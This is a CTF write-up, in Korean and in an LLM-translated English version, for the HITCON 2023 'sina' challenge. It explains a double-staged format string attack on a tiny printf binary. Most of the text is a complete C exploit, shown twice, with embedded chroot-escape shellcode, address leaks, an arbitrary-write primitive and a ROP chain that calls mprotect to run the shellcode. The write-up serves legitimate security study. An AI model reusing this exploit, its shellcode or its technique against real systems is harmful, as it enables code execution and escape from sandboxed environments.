---
title: 2023-hitcon-wall-sina
title_ko: 2023-hitcon-wall-sina
lang: en
draft: false
date: 2026-02-20
tags:
  - FSB
  - writeup
description: "{{description}}"
description_ko: "{{description_ko}}"
---

[lang:ko]
# Write-Up

FSB가 `main()` 내에서 발생하며 format string의 길이는 0x40 byte이다.

```c
#include <unistd.h>
#include <stdio.h>

int main();

char buff[0x48];
void *const gift = main;

int main() {
    read(STDIN_FILENO, buff, 0x40);
    printf(buff);
}
```

버그는 단순하지만, format string이 .bss 섹션에 있고 chroot 감옥에서 탈출해야 하므로 단순한 payload로는 문제를 해결할 수 없다.

먼저 환경 변수를 사용하여 chroot jail을 탈출하는 shellcode를 스택에 넣어 chroot 감옥에서 탈출할 준비를 했다.

둘째, 스택을 가리키는 포인터를 사용하여 main의 return address를 덮을 방법을 찾았다. 하지만, main의 return address가 저장되는 곳은 ASLR에 의해 무작위로 변하기 때문에 1/4096 의 확률로만 작동가능헀다.

> **Format String**: `%p%c%p%c%c%c%c%c%c%c%c%c%p%c%60131c%hn%281c%43$hhn`
> 
> **FSB 트리거 전**: ptr1 → ptr2, 그리고 ptr2 → ???
> 
> **FSB 트리거 후**: ptr1 → ptr2 (main의 return address를 가리킴), 그리고 ptr2 → (main의 return address). return address의 최하위 바이트를 0x31로 변경

셋째, `leak + ret2main` 와 `1-byte write + ret2main`을 수행하는 payload를 작성했다. 첫 번째 payload를 사용하여 스택, libc 및 PIE 주소를 유출했고, 두 번째 payload를 사용하여 AAW(Arbitrary Address Write) primitive를 만들었다.

넷째, 유출된 주소와 AAW primitive를 사용하여 `mprotect(shellcode_addr, 0x2000, PROT_WRITE | PROT_READ | PROT_EXEC); shellcode();`를 수행하는 ROP 체인을 작성했다.

최종적으로, 반환 주소의 최하위 바이트를 0x4로 덮어써서 ROP 체인을 트리거했다.

# 여담
- 이 문제를 풀기 전에 유사한 문제에 대한 [write-up](https://ctftime.org/writeup/24611)를 읽어본 상태라 비교적 수월하게 풀 수 있었다.
- 한국에서 유독 이런식으로 FSB를 이용해서 푸는 방법을 double staged FSB 라고 부르던데, 구글링을 하다보니 2012년(!)에 mongii라는 분이 이 기법을 만들고 pwn3r_45 선배가 이를 double staged FSB 라고 이름을 붙였다는 [글](https://pwn3r.tistory.com/entry/Docs-Double-Staged-Format-String-Attack)을 보게되었다. 난이도에 비해 생각보다 훨씬 오래된 기법이었다는 걸 알고 꽤나 충격을 받았다.

# Exploit
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <ctype.h>
#include <sys/mman.h>

char buff[0x100000];
int in_fd[2];
int out_fd[2];

uint64_t codebase;
uint64_t libcbase;
uint64_t main_ret;

#define PAGE_SIZE 0x2000
uint64_t mprotect_;
uint64_t pop_rdi;
uint64_t rwx_addr;
uint64_t pop_rsi;
uint64_t pop_rdx;
uint64_t shellcode_addr;

void fatal(const char *msg)
{
    fprintf(stderr, "[-] %s: %m\\n", msg);
    exit(EXIT_FAILURE);
}

void bp(void)
{
    scanf("%*c");
}

#ifndef HEXDUMP_COLS
#define HEXDUMP_COLS 16
#endif

void hexdump(void *mem, unsigned int len)
{
    unsigned int i, j;

    for(i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++)
    {
        /* print offset */
        if(i % HEXDUMP_COLS == 0)
        {
            printf("0x%06x: ", i);
        }

        /* print hex data */
        if(i < len)
        {
            printf("%02x ", 0xFF & ((char*)mem)[i]);
        }
        else /* end of block, just aligning for ASCII dump */
        {
            printf("   ");
        }

        /* print ASCII dump */
        if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1))
        {
            for(j = i - (HEXDUMP_COLS - 1); j <= i; j++)
            {
                if(j >= len) /* end of block, not really printing */
                {
                    putchar(' ');
                }
                else if(isprint(((char*)mem)[j])) /* printable char */
                {
                    putchar(0xFF & ((char*)mem)[j]);
                }
                else /* other char */
                {
                    putchar('.');
                }
            }
            putchar('\\n');
        }
    }
}

#define UINT_DIGITS 20
char *uitoa(unsigned int i)
{
    /* Room for UINT_DIGITS digits and '\\0' */
    static char buf[UINT_DIGITS + 1];
    char *p = buf + UINT_DIGITS;        /* points to terminating '\\0' */
    do {
        *--p = '0' + (i % 10);
        i /= 10;
    } while (i != 0);
    return p;
}

int main() {
    const char shellcode[] = "SHELLCODE=\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x68\\x67\\x6f\\x67\\x6f\\x48\\x89\\xe7\\x31\\xf6\\x66\\xbe\\xed\\x01\\x6a\\x53\\x58\\x0f\\x05\\x68\\x67\\x6f\\x67\\x6f\\x48\\x89\\xe7\\x31\\xc0\\xb0\\xa1\\x0f\\x05\\x68\\x2f\\x2f\\x01\\x01\\x81\\x34\\x24\\x01\\x01\\x01\\x01\\x48\\x89\\xe7\\x6a\\x50\\x58\\x0f\\x05\\x68\\x2f\\x2f\\x01\\x01\\x81\\x34\\x24\\x01\\x01\\x01\\x01\\x48\\x89\\xe7\\x6a\\x50\\x58\\x0f\\x05\\x68\\x2f\\x2f\\x01\\x01\\x81\\x34\\x24\\x01\\x01\\x01\\x01\\x48\\x89\\xe7\\x6a\\x50\\x58\\x0f\\x05\\x68\\x2f\\x2f\\x01\\x01\\x81\\x34\\x24\\x01\\x01\\x01\\x01\\x48\\x89\\xe7\\x6a\\x50\\x58\\x0f\\x05\\x68\\x2f\\x2f\\x01\\x01\\x81\\x34\\x24\\x01\\x01\\x01\\x01\\x48\\x89\\xe7\\x6a\\x50\\x58\\x0f\\x05\\x68\\x2f\\x2f\\x01\\x01\\x81\\x34\\x24\\x01\\x01\\x01\\x01\\x48\\x89\\xe7\\x6a\\x50\\x58\\x0f\\x05\\x68\\x2f\\x2f\\x01\\x01\\x81\\x34\\x24\\x01\\x01\\x01\\x01\\x48\\x89\\xe7\\x6a\\x50\\x58\\x0f\\x05\\x6a\\x2e\\x48\\x89\\xe7\\x31\\xc0\\xb0\\xa1\\x0f\\x05\\x48\\xb8\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x50\\x48\\xb8\\x2e\\x63\\x68\\x6f\\x2e\\x72\\x69\\x01\\x48\\x31\\x04\\x24\\x48\\x89\\xe7\\x48\\xb8\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x50\\x48\\xb8\\x2e\\x63\\x68\\x6f\\x2e\\x72\\x69\\x01\\x48\\x31\\x04\\x24\\x31\\xf6\\x56\\x6a\\x08\\x5e\\x48\\x01\\xe6\\x56\\x48\\x89\\xe6\\x31\\xd2\\x6a\\x3b\\x58\\x0f\\x05";

    pipe(in_fd);
    pipe(out_fd);

    pid_t pid = fork();
    if (pid < 0) {
        fatal("fork");
        exit(1);
    }
    if (pid == 0) {
        // In child
        close(out_fd[0]);
        dup2(out_fd[1], STDOUT_FILENO);
        close(out_fd[1]);

        close(in_fd[1]);
        dup2(in_fd[0], STDIN_FILENO);
        close(in_fd[0]);

        const char *child_argv[] ={
            "/home/user/sina",
            "sina",
            NULL
        };

        const char *child_envp[] = {
            shellcode,
            NULL
        };

        execve("/home/user/sina", child_argv, child_envp);
        fatal("execve");
    }
    // In parent
    close(in_fd[0]);
    close(out_fd[1]);

    write(in_fd[1], "%p%c%p%c%c%c%c%c%c%c%c%c%p%c%" "60131" "c%hn%" "281" "c%43$hhn", 0x40);
    read(out_fd[0], buff, 0x100000);

    hexdump(buff, 0x100);
    codebase = strtoul(&buff[0], NULL, 16) - 0x4040;
    libcbase = strtoul(&buff[0xf], NULL, 16) - 0xfda22;
    main_ret = strtoul(&buff[0x26], NULL, 16) - 0x110;

    printf("[+] codebase: %#lx\\n", codebase);
    printf("[+] libcbase: %#lx\\n", libcbase);
    printf("[+] main_ret: %#lx\\n", main_ret);

    mprotect_ = libcbase + 0x106b90;
    pop_rdi = libcbase + 0x00196495;
    rwx_addr = (main_ret & ~(PAGE_SIZE - 1));
    pop_rsi = libcbase + 0x00197ad7;
    pop_rdx = libcbase + 0x001002c2;
    shellcode_addr = main_ret + 0x2d3;
    printf("[+] mprotect: %#lx\\n", mprotect_);
    printf("[+] rwx_addr: %#lx\\n", rwx_addr);
    printf("[+] shellcode_addr: %#lx\\n", shellcode_addr);

    char payload[0x40];

    snprintf(payload, 0x40, "%%" "49c" "%%43$hhn%%" "%ld" "c%%30$hhn", 0x100 + 0x79 - 0x31);
    write(in_fd[1], payload, 0x40);
    read(out_fd[0], buff, 0x1000);
    usleep(1000);

    snprintf(payload, 0x40, "%%" "49c" "%%43$hhn%%" "%ld" "c%%46$hhn", 0x100 + (((main_ret)>>8)&0xff) - 0x31);
    write(in_fd[1], payload, 0x40);
    read(out_fd[0], buff, 0x1000);
    usleep(1000);

    snprintf(payload, 0x40, "%%" "49c" "%%43$hhn%%" "%ld" "c%%30$hhn", 0x100 + 0x78 - 0x31);
    write(in_fd[1], payload, 0x40);
    read(out_fd[0], buff, 0x1000);
    usleep(1000);

    snprintf(payload, 0x40, "%%" "49c" "%%43$hhn%%" "%ld" "c%%46$hhn", 0x100 + ((main_ret)&0xff) - 0x31);
    write(in_fd[1], payload, 0x40);
    read(out_fd[0], buff, 0x1000);
    usleep(1000);

    uint64_t values[10] = {
        pop_rdi,
        0,
        pop_rdi,
        rwx_addr,
        pop_rsi,
        PAGE_SIZE,
        pop_rdx,
        7,
        mprotect_,
        shellcode_addr
    };

    uint8_t *zz = values;

    for(int i = 0; i < 0x50; i++)
    {
        if (8 <= i && i < 0x10)
            continue;
        snprintf(payload, 0x40, "%%" "49c" "%%43$hhn%%" "%ld" "c%%46$hhn", 0x100 + 0x20 + i - 0x31);
        write(in_fd[1], payload, 0x40);
        read(out_fd[0], buff, 0x100);
        usleep(10000);

        if (zz[i] == 0x31)
            snprintf(payload, 0x40, "%%" "49c" "%%43$hhn%%85$hhn");
        else
            snprintf(payload, 0x40, "%%" "49c" "%%43$hhn%%" "%d" "c%%85$hhn", 0x100 + zz[i] - 0x31);
        write(in_fd[1], payload, 0x40);
        read(out_fd[0], buff, 0x100);
        usleep(10000);
    }

    write(in_fd[1], "%4c%43$hhn", 0x40);
    usleep(10000);

    write(in_fd[1], "cat /home/user/flag >&2\\n", 25);

    return 0;
}
```

[lang:en]

> [!warning] This post was translated by an LLM. If you would like to read the original, please click the `한국어` button in the top-left corner.

# Write-Up
FSB occurs within `main()` and length of format string is only 0x40 bytes.

```c
#include <unistd.h>
#include <stdio.h>

int main();

char buff[0x48];
void *const gift = main;

int main() {
    read(STDIN_FILENO, buff, 0x40);
    printf(buff);
}
```

The bug is simple, but this challenge cannot be solved with a simple payload, since the format string is in the .bss section and we must escape from a chroot jail. (It means we cannot use easier ways. e.g. oneshot gadget)

First, I put shellcode into the stack using an environment variable to escape from the chroot jail. 

Second, I found a way to return to main by using a pointer that points to the stack. Unfortunately, my solution only works with a probability of 1/4096 because I don't know where the return address of main is located.

**Format String**: `%p%c%p%c%c%c%c%c%c%c%c%c%p%c%60131c%hn%281c%43$hhn`

> **Before triggering FSB**: 
> ptr1 ⇒ ptr2 && ptr2 ⇒ ???
> 
> **After triggering FSB**: 
> ptr1 ⇒ ptr2 (points to return address of main)
> ptr2 ⇒ (return address of main)

and overwrite least significant byte of the return address to 0x31

Third, I created a payload that performs either `Leak + ret2main` or `1-byte write + ret2main`. I used the first payload to leak stack, libc, and PIE addresses. I used the second payload to create an AAW (Arbitrary Address Write) primitive.

Fourth, I wrote an ROP chain that performs `mprotect(shellcode_addr, 0x2000, PROT_WRITE | PROT_READ | PROT_EXEC); shellcode();` using leaked addresses and the AAW primitive.

Finally, the ROP chain was triggered by overwriting the least significant byte of the return address to 0x4.

# Additional Notes
- Before solving this problem, I had read a [write-up](https://ctftime.org/writeup/24611) on a similar problem, so I was able to solve it relatively smoothly.
- In Korea, this method of solving the challenge using FSB is uniquely called "double staged FSB." When I searched on Google, I found an [article](https://pwn3r.tistory.com/entry/Docs-Double-Staged-Format-String-Attack) mentioning that `mongii` created this technique in 2012 (!), and `pwn3r_45`, a fellow alumnus, named it "double staged FSB." I was quite shocked to learn that despite its difficulty level, this is a much older technique than I thought.

# Exploit
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <ctype.h>
#include <sys/mman.h>

char buff[0x100000];
int in_fd[2];
int out_fd[2];

uint64_t codebase;
uint64_t libcbase;
uint64_t main_ret;

#define PAGE_SIZE 0x2000
uint64_t mprotect_;
uint64_t pop_rdi;
uint64_t rwx_addr;
uint64_t pop_rsi;
uint64_t pop_rdx;
uint64_t shellcode_addr;

void fatal(const char *msg)
{
    fprintf(stderr, "[-] %s: %m\\n", msg);
    exit(EXIT_FAILURE);
}

void bp(void)
{
    scanf("%*c");
}

#ifndef HEXDUMP_COLS
#define HEXDUMP_COLS 16
#endif

void hexdump(void *mem, unsigned int len)
{
    unsigned int i, j;

    for(i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++)
    {
        /* print offset */
        if(i % HEXDUMP_COLS == 0)
        {
            printf("0x%06x: ", i);
        }

        /* print hex data */
        if(i < len)
        {
            printf("%02x ", 0xFF & ((char*)mem)[i]);
        }
        else /* end of block, just aligning for ASCII dump */
        {
            printf("   ");
        }

        /* print ASCII dump */
        if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1))
        {
            for(j = i - (HEXDUMP_COLS - 1); j <= i; j++)
            {
                if(j >= len) /* end of block, not really printing */
                {
                    putchar(' ');
                }
                else if(isprint(((char*)mem)[j])) /* printable char */
                {
                    putchar(0xFF & ((char*)mem)[j]);
                }
                else /* other char */
                {
                    putchar('.');
                }
            }
            putchar('\\n');
        }
    }
}

#define UINT_DIGITS 20
char *uitoa(unsigned int i)
{
    /* Room for UINT_DIGITS digits and '\\0' */
    static char buf[UINT_DIGITS + 1];
    char *p = buf + UINT_DIGITS;        /* points to terminating '\\0' */
    do {
        *--p = '0' + (i % 10);
        i /= 10;
    } while (i != 0);
    return p;
}

int main() {
    const char shellcode[] = "SHELLCODE=\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x68\\x67\\x6f\\x67\\x6f\\x48\\x89\\xe7\\x31\\xf6\\x66\\xbe\\xed\\x01\\x6a\\x53\\x58\\x0f\\x05\\x68\\x67\\x6f\\x67\\x6f\\x48\\x89\\xe7\\x31\\xc0\\xb0\\xa1\\x0f\\x05\\x68\\x2f\\x2f\\x01\\x01\\x81\\x34\\x24\\x01\\x01\\x01\\x01\\x48\\x89\\xe7\\x6a\\x50\\x58\\x0f\\x05\\x68\\x2f\\x2f\\x01\\x01\\x81\\x34\\x24\\x01\\x01\\x01\\x01\\x48\\x89\\xe7\\x6a\\x50\\x58\\x0f\\x05\\x68\\x2f\\x2f\\x01\\x01\\x81\\x34\\x24\\x01\\x01\\x01\\x01\\x48\\x89\\xe7\\x6a\\x50\\x58\\x0f\\x05\\x68\\x2f\\x2f\\x01\\x01\\x81\\x34\\x24\\x01\\x01\\x01\\x01\\x48\\x89\\xe7\\x6a\\x50\\x58\\x0f\\x05\\x68\\x2f\\x2f\\x01\\x01\\x81\\x34\\x24\\x01\\x01\\x01\\x01\\x48\\x89\\xe7\\x6a\\x50\\x58\\x0f\\x05\\x68\\x2f\\x2f\\x01\\x01\\x81\\x34\\x24\\x01\\x01\\x01\\x01\\x48\\x89\\xe7\\x6a\\x50\\x58\\x0f\\x05\\x68\\x2f\\x2f\\x01\\x01\\x81\\x34\\x24\\x01\\x01\\x01\\x01\\x48\\x89\\xe7\\x6a\\x50\\x58\\x0f\\x05\\x6a\\x2e\\x48\\x89\\xe7\\x31\\xc0\\xb0\\xa1\\x0f\\x05\\x48\\xb8\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x50\\x48\\xb8\\x2e\\x63\\x68\\x6f\\x2e\\x72\\x69\\x01\\x48\\x31\\x04\\x24\\x48\\x89\\xe7\\x48\\xb8\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x50\\x48\\xb8\\x2e\\x63\\x68\\x6f\\x2e\\x72\\x69\\x01\\x48\\x31\\x04\\x24\\x31\\xf6\\x56\\x6a\\x08\\x5e\\x48\\x01\\xe6\\x56\\x48\\x89\\xe6\\x31\\xd2\\x6a\\x3b\\x58\\x0f\\x05";

    pipe(in_fd);
    pipe(out_fd);

    pid_t pid = fork();
    if (pid < 0) {
        fatal("fork");
        exit(1);
    }
    if (pid == 0) {
        // In child
        close(out_fd[0]);
        dup2(out_fd[1], STDOUT_FILENO);
        close(out_fd[1]);

        close(in_fd[1]);
        dup2(in_fd[0], STDIN_FILENO);
        close(in_fd[0]);

        const char *child_argv[] ={
            "/home/user/sina",
            "sina",
            NULL
        };

        const char *child_envp[] = {
            shellcode,
            NULL
        };

        execve("/home/user/sina", child_argv, child_envp);
        fatal("execve");
    }
    // In parent
    close(in_fd[0]);
    close(out_fd[1]);

    write(in_fd[1], "%p%c%p%c%c%c%c%c%c%c%c%c%p%c%" "60131" "c%hn%" "281" "c%43$hhn", 0x40);
    read(out_fd[0], buff, 0x100000);

    hexdump(buff, 0x100);
    codebase = strtoul(&buff[0], NULL, 16) - 0x4040;
    libcbase = strtoul(&buff[0xf], NULL, 16) - 0xfda22;
    main_ret = strtoul(&buff[0x26], NULL, 16) - 0x110;

    printf("[+] codebase: %#lx\\n", codebase);
    printf("[+] libcbase: %#lx\\n", libcbase);
    printf("[+] main_ret: %#lx\\n", main_ret);

    mprotect_ = libcbase + 0x106b90;
    pop_rdi = libcbase + 0x00196495;
    rwx_addr = (main_ret & ~(PAGE_SIZE - 1));
    pop_rsi = libcbase + 0x00197ad7;
    pop_rdx = libcbase + 0x001002c2;
    shellcode_addr = main_ret + 0x2d3;
    printf("[+] mprotect: %#lx\\n", mprotect_);
    printf("[+] rwx_addr: %#lx\\n", rwx_addr);
    printf("[+] shellcode_addr: %#lx\\n", shellcode_addr);

    char payload[0x40];

    snprintf(payload, 0x40, "%%" "49c" "%%43$hhn%%" "%ld" "c%%30$hhn", 0x100 + 0x79 - 0x31);
    write(in_fd[1], payload, 0x40);
    read(out_fd[0], buff, 0x1000);
    usleep(1000);

    snprintf(payload, 0x40, "%%" "49c" "%%43$hhn%%" "%ld" "c%%46$hhn", 0x100 + (((main_ret)>>8)&0xff) - 0x31);
    write(in_fd[1], payload, 0x40);
    read(out_fd[0], buff, 0x1000);
    usleep(1000);

    snprintf(payload, 0x40, "%%" "49c" "%%43$hhn%%" "%ld" "c%%30$hhn", 0x100 + 0x78 - 0x31);
    write(in_fd[1], payload, 0x40);
    read(out_fd[0], buff, 0x1000);
    usleep(1000);

    snprintf(payload, 0x40, "%%" "49c" "%%43$hhn%%" "%ld" "c%%46$hhn", 0x100 + ((main_ret)&0xff) - 0x31);
    write(in_fd[1], payload, 0x40);
    read(out_fd[0], buff, 0x1000);
    usleep(1000);

    uint64_t values[10] = {
        pop_rdi,
        0,
        pop_rdi,
        rwx_addr,
        pop_rsi,
        PAGE_SIZE,
        pop_rdx,
        7,
        mprotect_,
        shellcode_addr
    };

    uint8_t *zz = values;

    for(int i = 0; i < 0x50; i++)
    {
        if (8 <= i && i < 0x10)
            continue;
        snprintf(payload, 0x40, "%%" "49c" "%%43$hhn%%" "%ld" "c%%46$hhn", 0x100 + 0x20 + i - 0x31);
        write(in_fd[1], payload, 0x40);
        read(out_fd[0], buff, 0x100);
        usleep(10000);

        if (zz[i] == 0x31)
            snprintf(payload, 0x40, "%%" "49c" "%%43$hhn%%85$hhn");
        else
            snprintf(payload, 0x40, "%%" "49c" "%%43$hhn%%" "%d" "c%%85$hhn", 0x100 + zz[i] - 0x31);
        write(in_fd[1], payload, 0x40);
        read(out_fd[0], buff, 0x100);
        usleep(10000);
    }

    write(in_fd[1], "%4c%43$hhn", 0x40);
    usleep(10000);

    write(in_fd[1], "cat /home/user/flag >&2\\n", 25);

    return 0;
}
```